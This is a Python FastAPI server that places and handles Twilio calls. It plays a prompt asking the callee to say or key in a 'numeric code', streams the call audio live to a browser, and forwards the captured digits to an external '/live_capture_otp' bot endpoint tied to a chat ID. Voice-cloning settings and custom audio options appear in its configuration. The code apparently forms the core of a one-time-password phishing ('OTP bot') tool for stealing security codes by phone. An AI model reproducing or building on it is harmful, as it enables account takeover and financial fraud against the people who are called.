"""
FastAPI server handling:
- WebSocket endpoint for browser clients: `/ws/live?call_id=...`
- WebSocket endpoint for Twilio Media Streams (incoming audio): `/twilio/media` (accepts JSON events)
- HTTP endpoints for Twilio status webhook and hangup control

Run with: `uvicorn live_listen.server:app --host 0.0.0.0 --port 5001` (or any free port)
"""
import asyncio
import base64
import json
import os
import threading
import requests
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, HTTPException
from fastapi.responses import JSONResponse, HTMLResponse, Response
from typing import Optional

from config import ACCOUNT_SID, AUTH_TOKEN, LIVE_LISTEN_URL, NGROK_URL, LIVE_LISTEN_SECRET, DEFAULT_VOICE_ID, VOICE_STABILITY, VOICE_SIMILARITY_BOOST
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse, Gather, Start

from live_listen.manager import manager

app = FastAPI()
twilio_client = Client(ACCOUNT_SID, AUTH_TOKEN)


@app.get('/live')
async def live_ui(request: Request):
    """Serve a simple Live Listen Web App UI. Query param: call_id"""
    html_path = os.path.join(os.path.dirname(__file__), 'static', 'live.html')
    if not os.path.exists(html_path):
        return HTMLResponse('<h1>Live UI not found</h1>', status_code=404)
    return HTMLResponse(open(html_path, 'r', encoding='utf-8').read())


@app.get('/health')
async def health():
    return {'status': 'ok'}


@app.post('/conversation/start')
async def conversation_start(request: Request):
    body = {}
    try:
        body = await request.json()
    except Exception:
        try:
            form = await request.form()
            body = dict(form)
        except Exception:
            body = {}

    call_sid = body.get('call_sid') or body.get('CallSid')
    chat_id = body.get('chat_id')
    if chat_id is not None:
        try:
            chat_id = int(chat_id)
        except (ValueError, TypeError):
            chat_id = None
    if not call_sid:
        raise HTTPException(status_code=400, detail='call_sid required')
    try:
        from live_listen.conversation import start_conversation
        asyncio.create_task(start_conversation(call_sid, chat_id))
        return {'ok': True}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.post('/twilio/entry')
async def twilio_entry(request: Request):
    form = await request.form()
    call_sid = form.get('CallSid')
    chat_id = request.query_params.get('chat_id')
    user_id = request.query_params.get('user_id')
    custom_audio = request.query_params.get('audio')
    if call_sid:
        try:
            from live_listen.conversation import start_conversation
            asyncio.create_task(start_conversation(call_sid, chat_id, user_id, custom_audio))
        except Exception:
            pass

    media_url = LIVE_LISTEN_URL.replace('https://', 'wss://').replace('http://', 'ws://') + '/twilio/media'
    response = VoiceResponse()
    stream = Start()
    stream.stream(url=media_url)
    response.append(stream)

    gather_action = f'{LIVE_LISTEN_URL}/twilio/dtmf'
    if chat_id:
        gather_action += f'?chat_id={chat_id}'
    gather = Gather(input='speech dtmf', timeout=5, num_digits=6, action=gather_action, speech_timeout='auto', method='POST')
    gather.say('Please say or enter the numeric code when prompted.')
    response.append(gather)
    return Response(str(response), media_type='application/xml')


def notify_bot_of_digits(chat_id: str, call_sid: str, digits: str) -> None:
    if not NGROK_URL or not chat_id or not call_sid or not digits:
        return
    url = f"{NGROK_URL.rstrip('/')}/live_capture_otp"
    payload = {"chat_id": chat_id, "call_sid": call_sid, "digits": digits}
    headers = {}
    if LIVE_LISTEN_SECRET:
        headers["X-Live-Listen-Secret"] = LIVE_LISTEN_SECRET
    try:
        requests.post(url, json=payload, timeout=3, headers=headers)
    except Exception:
        pass


@app.post('/twilio/dtmf')
async def twilio_dtmf(request: Request):
    if request.headers.get('content-type', '').startswith('application/json'):
        payload = await request.json()
    else:
        form = await request.form()
        payload = dict(form)

    call_sid = payload.get('call_sid') or payload.get('CallSid')
    digits = payload.get('Digits')
    transcript = payload.get('SpeechResult') or payload.get('speech_result') or payload.get('transcript')
    chat_id = request.query_params.get('chat_id')
    if not call_sid:
        raise HTTPException(status_code=400, detail='call_sid required')

    try:
        if digits:
            from live_listen.conversation import handle_captured_digits
            asyncio.create_task(handle_captured_digits(call_sid, digits))
            if chat_id:
                threading.Thread(target=notify_bot_of_digits, args=(chat_id, call_sid, digits), daemon=True).start()
        if transcript:
            from live_listen.conversation import handle_captured_transcript
            asyncio.create_task(handle_captured_transcript(call_sid, transcript))
    except Exception:
        pass

    return {'ok': True}


@app.websocket('/ws/live')
async def websocket_live(websocket: WebSocket, call_id: Optional[str] = None):
    """Browser Web App connects here to receive binary audio frames.

    Query params: call_id
    Sends: binary audio frames directly as bytes (clients should decode/play)
   """
    if not call_id:
        await websocket.close(code=1008)
        return
    await websocket.accept()
    await manager.add_client(call_id, websocket)
    try:
        # Notify client of session state on connect
        s = await manager.ensure_session(call_id)
        await websocket.send_text(json.dumps({'type': 'session', 'data': s.to_dict()}))
        while True:
            # Keep connection alive; we don't expect client messages except pings
            msg = await websocket.receive_text()
            # ignore or handle simple control messages
            await websocket.send_text(json.dumps({'type': 'pong'}))
    except WebSocketDisconnect:
        await manager.remove_client(call_id, websocket)
    except Exception:
        await manager.remove_client(call_id, websocket)
        await websocket.close()


@app.websocket('/twilio/media')
async def twilio_media(ws: WebSocket):
    """Twilio Media Streams will connect here and send JSON messages.

    Example Twilio 'media' event payload contains base64 audio in event['media']['payload']
    We'll parse and forward decoded bytes to browser clients.
   """
    await ws.accept()
    call_id = None
    try:
        while True:
            msg = await ws.receive_text()
            try:
                data = json.loads(msg)
            except Exception:
                continue

            event = data.get('event')
            if event == 'start':
                # Twilio start contains callSid, track, etc.
                call_sid = data.get('start', {}).get('callSid')
                # Use callSid as call_id (or transform as needed)
                call_id = call_sid
                await manager.ensure_session(call_id, call_sid=call_sid)
                await manager.set_state(call_id, 'in-progress')
            elif event == 'media':
                media = data.get('media', {})
                payload_b64 = media.get('payload')
                if payload_b64 and call_id:
                    try:
                        audio_bytes = base64.b64decode(payload_b64)
                        # Broadcast raw PCM or encoded bytes depending on Twilio config
                        await manager.broadcast_media(call_id, audio_bytes)
                        # Also pass media to conversation handler for interruption detection and STT
                        try:
                            from live_listen.conversation import handle_media_event
                            asyncio.create_task(handle_media_event(call_id, audio_bytes))
                        except Exception:
                            pass
                    except Exception:
                        pass
            elif event == 'stop':
                # Clean up session state
                if call_id:
                    await manager.set_state(call_id, 'completed')
                    # close clients will be handled by cleanup
    except WebSocketDisconnect:
        return


@app.post('/twilio/status')
async def twilio_status(request: Request):
    """Receive Twilio call status callbacks (HTTP POST). Expects form-encoded values like `CallSid` and `CallStatus`."""
    form = await request.form()
    call_sid = form.get('CallSid')
    status = form.get('CallStatus')
    if not call_sid or not status:
        return JSONResponse({'ok': False}, status_code=400)
    # Map Twilio status to manager state and broadcast
    await manager.set_state(call_sid, status)
    return {'ok': True}


@app.post('/hangup')
async def hangup(request: Request):
    """Terminate a running call by CallSid or call_id.

    JSON body: {"call_sid": "ACxxx"}
   """
    body = await request.json()
    call_sid = body.get('call_sid')
    if not call_sid:
        raise HTTPException(status_code=400, detail='call_sid required')
    try:
        twilio_client.calls(call_sid).update(status='completed')
        await manager.set_state(call_sid, 'completed')
        return {'ok': True}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
